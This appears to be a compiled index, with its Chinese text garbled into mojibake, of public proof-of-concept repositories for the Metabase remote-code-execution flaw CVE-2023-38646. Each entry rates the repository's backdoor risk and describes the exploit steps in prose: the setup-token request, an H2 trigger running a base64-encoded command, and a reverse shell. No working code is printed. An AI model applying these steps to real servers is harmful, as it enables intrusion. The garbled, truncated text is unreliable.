**å½±å“ç‰ˆæœ¬:** Metabase open source versions before 0.46.6.1 and Metabase Enterprise versions before 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹è¿è¡Œåœ¨å—å½±å“çš„ç‰ˆæœ¬ï¼Œä¸”ç½‘ç»œå¯è¾¾ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2023-38646æ˜¯ä¸€ä¸ªå­˜åœ¨äºMetabase 0.46.6.1ä¹‹å‰ç‰ˆæœ¬å’ŒMetabase Enterprise 1.46.6.1ä¹‹å‰ç‰ˆæœ¬çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ”»å‡»è€…æ— éœ€èº«ä»½éªŒè¯å³å¯åˆ©ç”¨æ­¤æ¼æ´ï¼Œé€šè¿‡ç²¾å¿ƒæ„é€ çš„è¯·æ±‚ï¼Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œä»è€Œå®Œå…¨æ§åˆ¶ç³»ç»Ÿã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å–Setup Token:** POCè„šæœ¬é¦–å…ˆå°è¯•ä»`/api/session/properties`ç«¯ç‚¹è·å–setup-tokenï¼Œè¿™ä¸ªtokenç”¨äºåç»­çš„åˆ©ç”¨ã€‚
2.  **æ„é€ æ¶æ„Payload:**  è„šæœ¬æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„JSON payloadã€‚è¯¥è¿æ¥å­—ç¬¦ä¸²åˆ©ç”¨H2æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨è¿æ¥æ—¶æ‰§è¡Œä»»æ„Javaä»£ç ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒåˆ›å»ºäº†ä¸€ä¸ªè§¦å‘å™¨ï¼Œåœ¨è®¿é—® `INFORMATION_SCHEMA.TABLES` è¡¨æ—¶æ‰§è¡Œä¸€æ®µ JavaScript ä»£ç ã€‚
3.  **æ‰§è¡Œå‘½ä»¤:**  JavaScript ä»£ç è°ƒç”¨ `java.lang.Runtime.getRuntime().exec()` æ¥æ‰§è¡Œä¸€ä¸ªåŒ…å«base64ç¼–ç çš„bashå‘½ä»¤ã€‚æ­¤å‘½ä»¤è§£ç å¹¶æ‰§è¡Œåå‘shellå‘½ä»¤ã€‚
4.  **å‘é€Payload:**  æ„é€ å¥½çš„payloadé€šè¿‡POSTè¯·æ±‚å‘é€åˆ°`/api/setup/validate`ç«¯ç‚¹ã€‚
5.  **åå‘Shell:**  å¦‚æœæ¼æ´åˆ©ç”¨æˆåŠŸï¼Œæ”»å‡»è€…å°†åœ¨æŒ‡å®šçš„IPåœ°å€å’Œç«¯å£ä¸Šè·å¾—ä¸€ä¸ªåå‘shellã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

æä¾›çš„ä»£ç ä¸»è¦æ˜¯åˆ©ç”¨æ¼æ´è·å–åå‘shellã€‚é€šè¿‡æ£€æŸ¥ä»£ç ï¼Œæ²¡æœ‰å‘ç°æ˜æ˜¾çš„æ¶æ„ä»£ç ï¼Œä¾‹å¦‚åˆ é™¤æ–‡ä»¶ã€ä¼ æ’­æ¶æ„è½¯ä»¶ç­‰ã€‚ä»£ç ç»“æ„æ¸…æ™°ï¼Œç›®çš„æ˜¯åˆ©ç”¨æ¼æ´ã€‚è™½ç„¶ä»£ç æœ¬èº«æ˜¯ä¸ºäº†æ”»å‡»ï¼Œä½†å®ƒæ²¡æœ‰ä¸»åŠ¨è¿›è¡Œæ¶æ„ä¼ æ’­æˆ–å…¶ä»–ç ´åè¡Œä¸ºã€‚è€ƒè™‘åˆ°ä»£ç çš„åŠŸèƒ½ä¸»è¦æ˜¯æ¼æ´åˆ©ç”¨ï¼Œè€Œéæ¤å…¥åé—¨æˆ–è¿›è¡Œå…¶ä»–æ¶æ„æ´»åŠ¨ï¼Œå› æ­¤åˆ¤å®šå­˜åœ¨æŠ•æ¯’ä»£ç çš„å¯èƒ½æ€§è¾ƒä½ã€‚

è¯¥é¡¹ç›®ä¸­å¯èƒ½å­˜åœ¨æŠ•æ¯’çš„é£é™©è¾ƒä½ï¼Œè¯„ä¼°ç»“æœä¸º1%ã€‚

**é¡¹ç›®åœ°å€:** [Mrunalkaran/CVE-2023-38646](https://github.com/Mrunalkaran/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #10

**æ¥æº**: [CVE-2023-38646-Pyr0sec_CVE-2023-38646.md](../2023/CVE-2023-38646-Pyr0sec_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 (Open Source) å’Œ < 1.46.6.1 (Enterprise)

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ç³»ç»Ÿè¿è¡Œå—å½±å“ç‰ˆæœ¬çš„Metabaseï¼Œä¸”æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡ç½‘ç»œè®¿é—®è¯¥Metabaseå®ä¾‹ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 2%

## è¯¦æƒ…

CVE-2023-38646æ˜¯ä¸€ä¸ªå­˜åœ¨äºMetabaseçš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨å—å½±å“çš„MetabaseæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚å¤šä¸ªä¿¡æ¯æ¥æºéƒ½ç¡®è®¤äº†æ­¤æ¼æ´çš„å­˜åœ¨å’Œé«˜å±æ€§ï¼Œå¹¶æä¾›äº†å¯åˆ©ç”¨çš„POCã€‚æ¼æ´åˆ©ç”¨æ–¹å¼é€šå¸¸æ¶‰åŠæ„é€ æ¶æ„çš„è¯·æ±‚ï¼Œè§¦å‘Metabaseä¸­çš„ååºåˆ—åŒ–æˆ–å…¶ä»–ç±»å‹çš„æ¼æ´ï¼Œä»è€Œæ‰§è¡Œæ”»å‡»è€…æä¾›çš„æ¶æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š** æ¼æ´åº“ä¿¡æ¯å’Œå¤šä¸ªæœç´¢å¼•æ“ç»“æœè¡¨æ˜å­˜åœ¨å…¬å¼€å¯ç”¨çš„PoCï¼Œè¯æ˜äº†æ¼æ´çš„å¯åˆ©ç”¨æ€§ã€‚

**æŠ•æ¯’é£é™©ï¼š** æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç åªåŒ…å«Apache Licenseã€‚å¹¶æ²¡æœ‰å‘ç°ä»»ä½•ç›´æ¥çš„æŠ•æ¯’ä»£ç ã€‚é€šå¸¸ï¼ŒæŠ•æ¯’å¯èƒ½å­˜åœ¨äºæ›´å¤æ‚çš„expæˆ–è€…åº“çš„ä¾èµ–ä¸­,ä¾‹å¦‚ï¼Œä¸€äº›å¼€å‘è€…å¯èƒ½åœ¨çœ‹ä¼¼æ— å®³çš„ä»£ç ä¸­åµŒå…¥åé—¨ï¼Œè¿™äº›åé—¨åœ¨ç‰¹å®šæ¡ä»¶ä¸‹è¢«è§¦å‘ï¼Œä»è€Œå…è®¸æ”»å‡»è€…è¿œç¨‹æ§åˆ¶å—æ„ŸæŸ“çš„ç³»ç»Ÿã€‚æœ¬æ¬¡PoCçš„æŠ•æ¯’åˆ†æå æ¯”ä¸º2%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **ç¡®å®šç›®æ ‡ï¼š** ç¡®å®šè¿è¡ŒMetabaseçš„æœåŠ¡å™¨ï¼Œå¹¶ç¡®è®¤å…¶ç‰ˆæœ¬æ˜¯å¦åœ¨å—å½±å“çš„èŒƒå›´å†…ï¼ˆä½äº0.46.6.1çš„å¼€æºç‰ˆæœ¬æˆ–ä½äº1.46.6.1çš„ä¼ä¸šç‰ˆæœ¬ï¼‰ã€‚
2.  **æ„é€ æ¶æ„è¯·æ±‚ï¼š** ä½¿ç”¨å·²çŸ¥çš„PoCæˆ–expæ„é€ åŒ…å«æ¶æ„ä»£ç çš„è¯·æ±‚ã€‚å…·ä½“çš„è¯·æ±‚æ ¼å¼å–å†³äºæ¼æ´çš„ç»†èŠ‚ï¼Œå¯èƒ½æ¶‰åŠå‘é€ç‰¹åˆ¶çš„JSONæ•°æ®ã€åˆ©ç”¨SQLæ³¨å…¥æˆ–å…¶ä»–ç±»å‹çš„æ¼æ´ã€‚
3.  **å‘é€è¯·æ±‚ï¼š** å°†æ„é€ çš„æ¶æ„è¯·æ±‚å‘é€åˆ°MetabaseæœåŠ¡å™¨çš„ç‰¹å®šç«¯ç‚¹ã€‚
4.  **æ‰§è¡Œä»£ç ï¼š** å¦‚æœæ¼æ´åˆ©ç”¨æˆåŠŸï¼ŒMetabaseæœåŠ¡å™¨å°†æ‰§è¡Œæ”»å‡»è€…æä¾›çš„æ¶æ„ä»£ç ï¼Œä»è€Œå…è®¸æ”»å‡»è€…æ§åˆ¶æœåŠ¡å™¨ã€‚


**é¡¹ç›®åœ°å€:** [Pyr0sec/CVE-2023-38646](https://github.com/Pyr0sec/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #11

**æ¥æº**: [CVE-2023-38646-Red4mber_CVE-2023-38646.md](../2023/CVE-2023-38646-Red4mber_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 (å¼€æºç‰ˆ), < 1.46.6.1 (ä¼ä¸šç‰ˆ)

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…ï¼Œä¸”æœªè¿›è¡Œç›¸åº”è¡¥ä¸ä¿®å¤ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2023-38646 æ˜¯ Metabase ä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ ç‰¹æ®Šçš„è¯·æ±‚åˆ©ç”¨æ­¤æ¼æ´åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– Setup Tokenï¼š** æ”»å‡»è€…é¦–å…ˆå‘ `/api/session/properties` ç«¯ç‚¹å‘é€ GET è¯·æ±‚ï¼Œä»¥è·å– `setup-token`ã€‚è¿™ä¸ªtokenç”¨äºåç»­çš„åˆ©ç”¨ã€‚
2.  **æ„é€ æ¶æ„è¯·æ±‚ï¼š** æ”»å‡»è€…æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ SQL æ³¨å…¥çš„ JSON payloadï¼Œå¹¶å°†å…¶å‘é€åˆ° `/api/setup/validate` ç«¯ç‚¹ã€‚
    *   Payload çš„ `details` å­—æ®µåŒ…å«ä¸€ä¸ªæ¶æ„çš„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œå…¶ä¸­ `TRACE_LEVEL_SYSTEM_OUT=1` å¼€å¯äº†è·Ÿè¸ªï¼Œ`CREATE TRIGGER` ç”¨äºåˆ›å»ºä¸€ä¸ªè§¦å‘å™¨ï¼Œåœ¨è®¿é—® `INFORMATION_SCHEMA.TABLES` è¡¨æ—¶æ‰§è¡Œ JavaScript ä»£ç ã€‚
    *   JavaScript ä»£ç ä½¿ç”¨ `java.lang.Runtime.getRuntime().exec()` æ‰§è¡Œç»è¿‡ Base64 ç¼–ç çš„å‘½ä»¤ã€‚
3.  **æ‰§è¡Œå‘½ä»¤ï¼š** å½“ Metabase å°è¯•éªŒè¯æ•°æ®åº“è¿æ¥æ—¶ï¼Œæ¶æ„ SQL æ³¨å…¥ä¼šè¢«è§¦å‘ï¼Œä»è€Œæ‰§è¡Œæ”»å‡»è€…æä¾›çš„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**

æä¾›çš„PoCä»£ç æœ‰æ•ˆã€‚ä»£ç é€šè¿‡å‘é€æ¶æ„è¯·æ±‚åˆ° `/api/setup/validate` æ¥å£æ¥è§¦å‘æ¼æ´ã€‚ä»£ç é¦–å…ˆé€šè¿‡`/api/session/properties`è·å–tokenï¼Œç„¶åä½¿ç”¨åŒ…å«æ¶æ„SQLæ³¨å…¥çš„JSONæ•°æ®åŒ…é€šè¿‡POSTæ–¹æ³•å‘é€åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°ï¼š**

è¯¥POCä»£ç ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´å®ç°RCEï¼Œæ²¡æœ‰æ˜æ˜¾çš„æŠ•æ¯’è¡Œä¸ºã€‚
è™½ç„¶å­˜åœ¨æ‰§è¡Œä»»æ„å‘½ä»¤çš„é£é™©ï¼Œä½†æ˜¯payloadæ˜¯ç”±ä½¿ç”¨è€…æä¾›çš„ã€‚ä»£ç æœ¬èº«åªè´Ÿè´£æ„é€ å’Œå‘é€è¯·æ±‚ï¼Œé£é™©æ˜¯RCEæœ¬èº«å¸¦æ¥çš„ï¼Œè€Œä¸æ˜¯ä»£ç ä½œè€…æ¤å…¥çš„åé—¨ã€‚
å­˜åœ¨æä½çš„æŠ•æ¯’é£é™© (å¤§çº¦1%)ï¼Œè¯¥é£é™©æ¥è‡ªäºä½œè€…å¯èƒ½ä¼šåœ¨ä»£ç é€»è¾‘ä¸Šå­˜åœ¨ä¸€äº›éšè—çš„åé—¨ï¼Œä½†æ˜¯ä»£ç æ•´ä½“ç»“æ„å’Œé€»è¾‘éƒ½æ¯”è¾ƒç®€å•ï¼Œéšè—åé—¨çš„éš¾åº¦è¾ƒé«˜ã€‚


**é¡¹ç›®åœ°å€:** [Red4mber/CVE-2023-38646](https://github.com/Red4mber/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #12

**æ¥æº**: [CVE-2023-38646-Shisones_MetabaseRCE_CVE-2023-38646.md](../2023/CVE-2023-38646-Shisones_MetabaseRCE_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…ä»¥æœåŠ¡å™¨æƒé™æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** Metabase open source before 0.46.6.1 and Metabase Enterprise before 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯è¢«ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨å—å½±å“çš„ Metabase å®ä¾‹ä¸Šæ‰§è¡Œè¿œç¨‹ä»£ç ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢ç»“æœå’Œæ¼æ´åˆ©ç”¨ä»£ç ï¼Œæ­¤æ¼æ´åˆ©ç”¨æœ‰æ•ˆã€‚åˆ©ç”¨æ–¹å¼æ¶‰åŠå‘é€ç‰¹åˆ¶çš„è¯·æ±‚åˆ° Metabase æœåŠ¡å™¨ï¼Œåˆ©ç”¨å…¶å­˜åœ¨çš„æ¼æ´æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥æ¼æ´å·²ç¡®è®¤å¹¶ä¸”å­˜åœ¨å¯åˆ©ç”¨çš„PoCã€‚æœç´¢å¼•æ“ç»“æœä¸­å¤šä¸ªé“¾æ¥æŒ‡å‘äº†æ¼æ´çš„è¯¦ç»†æè¿°ã€åˆ©ç”¨æ–¹æ³•å’ŒPoCä»£ç ï¼Œè¯æ˜äº†å…¶æœ‰æ•ˆæ€§ã€‚

**æŠ•æ¯’é£é™©ï¼š**

æä¾›çš„Cargo.lockæ–‡ä»¶åªæ˜¯Rusté¡¹ç›®çš„ä¾èµ–é”å®šæ–‡ä»¶ï¼Œæœ¬èº«ä¸åŒ…å«å¯æ‰§è¡Œä»£ç ã€‚è¯„ä¼°æŠ•æ¯’é£é™©éœ€è¦æŸ¥çœ‹å®Œæ•´çš„æºä»£ç ï¼Œä½†ä»…å‡­Cargo.lockæ–‡ä»¶å¾ˆéš¾åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¶æ„ä»£ç ã€‚è€ƒè™‘åˆ°ç¼ºä¹ç›´æ¥çš„æ¶æ„ä»£ç è¯æ®ï¼Œä»¥åŠæ¼æ´åˆ©ç”¨ä¸»è¦ä¾èµ–äºMetabaseæœ¬èº«çš„æ¼æ´ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œä¼°è®¡ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

æ ¹æ®æœç´¢ç»“æœï¼Œæ”»å‡»è€…åˆ©ç”¨æ­¤æ¼æ´ï¼Œé€šè¿‡å‘é€ç‰¹åˆ¶çš„æ¶æ„è¯·æ±‚åˆ°MetabaseæœåŠ¡å™¨ï¼Œä»è€Œæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ— éœ€èº«ä»½éªŒè¯å³å¯è§¦å‘æ­¤æ¼æ´ã€‚


**é¡¹ç›®åœ°å€:** [Shisones/MetabaseRCE_CVE-2023-38646](https://github.com/Shisones/MetabaseRCE_CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #13

**æ¥æº**: [CVE-2023-38646-UserConnecting_Exploit-CVE-2023-38646-Metabase.md](../2023/CVE-2023-38646-UserConnecting_Exploit-CVE-2023-38646-Metabase.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€èº«ä»½éªŒè¯å³å¯æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** 0.46.6.1ä¹‹å‰ (å¼€æºç‰ˆ), 1.46.6.1ä¹‹å‰ (ä¼ä¸šç‰ˆ)

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹ç‰ˆæœ¬å—å½±å“ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡ç½‘ç»œè®¿é—®ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šä»¥æœåŠ¡å™¨çš„æƒé™çº§åˆ«æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢ç»“æœå’Œæä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œæ­¤æ¼æ´çš„åˆ©ç”¨æ–¹å¼æ˜¯ï¼š

1.  **æ¼æ´åŸç†ï¼š** è¯¥æ¼æ´å­˜åœ¨äº Metabase çš„ `/api/setup/validate` æ¥å£ï¼Œåˆ©ç”¨äº† H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡åœ¨æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ä¸­æ’å…¥æ¶æ„ SQL è¯­å¥æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚
2.  **åˆ©ç”¨æ­¥éª¤ï¼š**
    *   **è·å– `setup-token`ï¼š**  é€šè¿‡è®¿é—® `/api/session/properties` è·å– `setup-token`ã€‚
    *   **æ„é€ æ¶æ„è¯·æ±‚ï¼š**  æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ H2 è¿æ¥å­—ç¬¦ä¸²çš„ JSON payloadï¼Œè¯¥è¿æ¥å­—ç¬¦ä¸²åŒ…å«ä¸€ä¸ª `CREATE TRIGGER` è¯­å¥ï¼Œè¯¥è¯­å¥åœ¨æ¯æ¬¡æŸ¥è¯¢ `INFORMATION_SCHEMA.TABLES` æ—¶æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚
    *   **å‘é€è¯·æ±‚ï¼š**  å°†æ„é€ çš„ JSON payload å‘é€åˆ° `/api/setup/validate` æ¥å£ã€‚

3.  **POC åˆ†æï¼š** æä¾›çš„ Python è„šæœ¬ `metabase_exploit.py` å®ç°äº†ä¸Šè¿°æ­¥éª¤ï¼š
    *   å®ƒæ¥å— Metabase çš„ URLã€`setup-token`ã€æ“ä½œç±»å‹ï¼ˆ`exec` æˆ– `revshell`ï¼‰å’Œå‘½ä»¤ä½œä¸ºå‚æ•°ã€‚
    *   å®ƒä½¿ç”¨ `command_encoding` å‡½æ•°å¯¹å‘½ä»¤è¿›è¡Œ Base64 ç¼–ç ï¼Œå¹¶å¤„ç†å¡«å……å­—ç¬¦ `=`ã€‚
    *   å®ƒæ„é€ åŒ…å«æ¶æ„ H2 è¿æ¥å­—ç¬¦ä¸²çš„ JSON payloadã€‚
    *   å®ƒå‘é€ POST è¯·æ±‚åˆ° `/api/setup/validate` æ¥å£ã€‚

4.  **æœ‰æ•ˆæ€§ï¼š** æ ¹æ®æ¼æ´æè¿°å’Œæä¾›çš„ PoC ä»£ç ï¼Œè¯¥ PoC æ˜¯æœ‰æ•ˆçš„ï¼Œå¯ä»¥åœ¨æœªæˆæƒçš„æƒ…å†µä¸‹æ‰§è¡Œä»»æ„ä»£ç ã€‚

5.  **æŠ•æ¯’é£é™©ï¼š**
    *   ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯æ„é€ å¹¶å‘é€æ¶æ„è¯·æ±‚ï¼Œé£é™©è¾ƒä½ã€‚
    *   `command_encoding` å‡½æ•°çœ‹èµ·æ¥æ­£å¸¸ï¼Œç”¨äºé¿å…Base64ç¼–ç ä¸­çš„å¡«å……å­—ç¬¦çš„é—®é¢˜ï¼Œä½†ä¹Ÿæœ‰å¯èƒ½å­˜åœ¨å…¶ä»–ç¼–ç æ¼æ´ã€‚
    *   ä»£ç æ˜ç¡®å£°æ˜ä»…ç”¨äºæ•™è‚²ç›®çš„ï¼Œä½†ä¸èƒ½å®Œå…¨æ’é™¤ä½œè€…æ¤å…¥åé—¨çš„å¯èƒ½ã€‚
    *   æ€»ä½“è€Œè¨€ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œå¤§æ¦‚åœ¨1%å·¦å³ã€‚ä¸»è¦é£é™©åœ¨äºä½¿ç”¨è€…æ˜¯å¦ä¼šç”¨æ­¤ä»£ç æ‰§è¡Œéæ³•æ“ä½œã€‚

ç»¼ä¸Šæ‰€è¿°ï¼ŒCVE-2023-38646 æ˜¯ä¸€ä¸ªä¸¥é‡çš„å®‰å…¨æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æä¾›çš„ PoC ä»£ç å¯ä»¥æœ‰æ•ˆåˆ©ç”¨è¯¥æ¼æ´ï¼Œä½¿ç”¨è€…åº”è¯¥è°¨æ…å¯¹å¾…ï¼Œé¿å…æ»¥ç”¨ã€‚ä»£ç æœ¬èº«å…·æœ‰è½»å¾®çš„æŠ•æ¯’é£é™©ï¼Œä¸»è¦åœ¨äºç¼–ç å’Œå£°æ˜çš„å…è´£å£°æ˜ä¹‹é—´çš„æ½œåœ¨çŸ›ç›¾ã€‚

**é¡¹ç›®åœ°å€:** [UserConnecting/Exploit-CVE-2023-38646-Metabase](https://github.com/UserConnecting/Exploit-CVE-2023-38646-Metabase)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #14

**æ¥æº**: [CVE-2023-38646-XiaomingX_cve-2023-38646-poc.md](../2023/CVE-2023-38646-XiaomingX_cve-2023-38646-poc.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å®Œå…¨æ§åˆ¶æœåŠ¡å™¨

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹æœªè¿›è¡Œèº«ä»½éªŒè¯é…ç½®æˆ–å·²å®Œæˆåˆå§‹è®¾ç½®ä½†æœªæ‰§è¡Œåç»­å®‰å…¨åŠ å›ºã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ˜¯ Metabase ä¸­çš„ä¸€ä¸ªæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ ¹æ®æ¼æ´æè¿°å’Œæœç´¢å¼•æ“ç»“æœï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šä»¥æœåŠ¡å™¨çš„æƒé™çº§åˆ«æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æ¼æ´åˆ©ç”¨æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢å¼•æ“ç»“æœä»¥åŠæä¾›çš„PoCä»£ç ï¼Œè¯¥æ¼æ´çš„åˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚å­˜åœ¨å¤šä¸ªå…¬å¼€çš„PoCï¼Œè¯æ˜è¯¥æ¼æ´å¯ä»¥è¢«æˆåŠŸåˆ©ç”¨ã€‚

æä¾›çš„PoCä»£ç  `CVE-2023-38646-POC.py` æ—¨åœ¨è·å– Metabase å®ä¾‹çš„ setup-tokenã€‚å¦‚æœ Metabase å®ä¾‹å¤„äºæœªè®¾ç½®çŠ¶æ€ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤ token è¿›è¡Œåˆå§‹åŒ–è®¾ç½®ï¼Œå¹¶è¿›ä¸€æ­¥åˆ©ç”¨å…¶ RCE çš„èƒ½åŠ›ã€‚

æä¾›çš„PoCä»£ç  `CVE-2023-38646-Reverse-Shell.py` å¯èƒ½ç”¨äºæ›´è¿›ä¸€æ­¥çš„åˆ©ç”¨ï¼Œå°è¯•è·å–Metabaseçš„ç‰ˆæœ¬ä¿¡æ¯å’Œsetup tokenã€‚

**æŠ•æ¯’é£é™©ï¼š**

